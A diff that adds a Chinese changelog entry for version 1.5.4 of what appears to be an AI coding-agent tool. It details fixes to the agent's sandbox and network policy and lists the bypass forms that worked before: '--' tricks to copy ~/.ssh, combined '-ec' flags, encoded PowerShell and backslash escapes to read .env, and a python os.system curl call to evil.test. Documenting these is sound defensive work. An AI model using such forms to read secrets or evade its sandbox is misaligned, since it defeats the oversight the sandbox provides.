@@ -1,5 +1,38 @@
 # 更新日志
 
+## 1.5.4 - 2026-11-10
+
+### 修复
+
+- 沙箱：`--`（选项结束标记）被当成目录选项。`_directory_option_value` 只要求前一个词以 `--` 开头，于是 `grep -rn . -- ~/.ssh`、`cp -a -- ~/.ssh /tmp/exfil` 这种「`--` + 裸敏感目录」的形状整条被豁免，私钥可以被列出或复制。现在豁免只认已知目录选项（`--home`、`--dir`、`--cwd`、`--chdir`、`--directory`、`--prefix`、`--project`、`--work-tree`、`git -C`），并支持 `--home=<dir>` 这种粘值写法。
+- 沙箱：组合短选项没被当成内联命令。`_INLINE_FLAGS` 是精确匹配，`bash -ec 'cat .env'`、`sh -xc 'cat .env'` 的引号内容被当作数据，而同样内容跟在 `-c`/`-lc` 后面就会被扫描。现在任何以 `c` 结尾的单短横组合都与 `-c` 同等对待。
+- 沙箱：PowerShell 的 `-EncodedCommand` 没被解码。blob 只按普通词检查，`pwsh -EncodedCommand <UTF-16 的 Get-Content .env>` 读得到凭据，而 `pwsh -Command 'Get-Content .env'` 会被拒绝。现在敏感门也会解码并扫描，解不开的按不透明处理（fail closed）；解码与缩写规则和网络门共用同一份实现，避免两份规则漂移。
+- 沙箱：裸反斜杠转义没被还原。POSIX shell 在分词前会消掉 `\`，`cat \.env` 与 `cat .en\v` 打开的就是被拒绝的那个文件。现在未加引号的词额外检查去掉反斜杠后的拼写；引号内的文本仍按字面文件名处理，所以 `rg '\.env'` 不会误报。
+- 沙箱：敏感词判定在异常时 fail open。`Path(...).expanduser()` 抛错时整词被当成无害；现在退回按字面量判断（`~nosuchuser/.ssh/id_rsa` 仍然命中）。
+- 沙箱网络策略：`curl -X POST` 被读成代理。`_HOST_OPTION_RE` 带 `re.IGNORECASE`，`-x` 连 `-X` 一起匹配，`POST` 成了 allowlist 候选主机，指向白名单主机的合法请求被拒绝。现在 `-x` 大小写敏感，`-x host`、`-xhost:port`、`--proxy=`、`--socks5*` 照旧生效。
+- 沙箱网络策略：`python -c` 里的进程启动器漏检。payload 以整个引号串作为一个词送入扫描，`curl` 从未成为命令头，`python -c "import os;os.system('curl http://evil.test')"` 在 `deny` 下直接放行。现在 `os.system`、`os.popen`、`os.exec*`、`subprocess.*`、`pty.spawn` 本身就计为触网。
+- 沙箱网络策略：`npm run install` 被误判为安装。子命令探测会跳过任意位置参数，脚本名恰好叫 `install` 就被拒绝。现在只有已知命名空间（`uv pip`、`docker compose`、`poetry env`）才允许右移一位，`npm --loglevel verbose install x` 这类真实安装仍然拦得住。
+- 工具：`edit` 的 `lines_added` 用 `splitlines()` 统计，U+2028/U+2029 会让一行补丁报成两行，而 `read` 把同一文件仍显示为三行。现在与 `read` 一样按物理行统计。
+- 工具：`append_file` 在目标文件没有行尾符时把调用方的 CRLF 载荷改写成 LF，同样的内容在 `write` 里却保留 CRLF。现在没有可继承的风格时保留载荷自己的行尾。
+- 工具：`write` 覆盖「存在但没有行尾符」的文件时报告 `line_ending: none`，实际写入的却是 CRLF；现在报告与写入一致。
+- provider：Responses 协议把一次工具调用解析成两次。`response.output_item.added` 通常不带 `id`，增量按 `output_index` 累积，而带 `id` 的 `output_item.done` 会新开一个状态，同一个工具于是执行两遍。流式与 SSE body 两条路径都改为先按 `id`、再按 `output_index` 回查已有状态。
+- provider：SSE body 路径丢掉思考增量。`response.reasoning_summary_text.delta` 只在流式解析器里有分支，网关忽略 `stream: false` 时思考内容整段消失；现在两条路径一致，并避免与结束项重复输出。
+- provider：空的 `finish_reason` 被当成正常结束原因。payload 路径只判 `is not None`，`finish_reason: ""` 让 agent 把已完成的回答标记为未完成、`/summary` 报 `finish reason ''`；现在空字符串按缺失处理。
+- `shell`：1.5.3 的块注释修复留下了重复的 `_BLOCK_COMMENT_RE` 赋值和一段孤立注释，后者被当成说明留在代码里。
+
+### 变更
+
+- 版本号升级到 1.5.4。没有删除任何公开 `__all__` 名字、CLI 参数、配置键、JSON 输出字段、会话格式或工具 schema。
+- 默认系统提示（`minimalcode/prompt.py`）跟随工作区里已有的改动发布：语气更口语化，并把「无条件同意」换成「在安全合规和适用法律范围内尽力帮忙」，单次编辑上限从 40 行放宽到 100 行。
+
+### 文档
+
+- `README.md` 更新当前版本与 1.5.3 → 1.5.4 升级说明，并删掉重复的「升级指南」标题。`docs/configuration.md` 修好 1.5.3 留下的截断句子和重复段落，并补充 1.5.4 的敏感路径与网络规则；`docs/compatibility.md`、`docs/architecture.md` 更新适用版本与 1.5.4 变更清单。
+
+### 测试
+
+- 新增回归测试：`--` 不豁免敏感目录、`--home=<dir>` 粘值、组合短选项（`-ec`/`-xc`/`-lc`）、`-EncodedCommand`（可解码/不可解码/无害）、裸反斜杠转义、`curl -X POST` 不当作代理、`python -c` 里的 `os.system`/`subprocess.run`、`npm run install` 不被误判、`edit` 的物理行计数、`append_file` 的 CRLF 载荷、`write` 的 `line_ending` 报告、Responses 工具调用只解析一次（两条路径）、两条路径的思考增量、空 `finish_reason`。
+
 ## 1.5.3 - 2026-11-10
 
 ### 修复
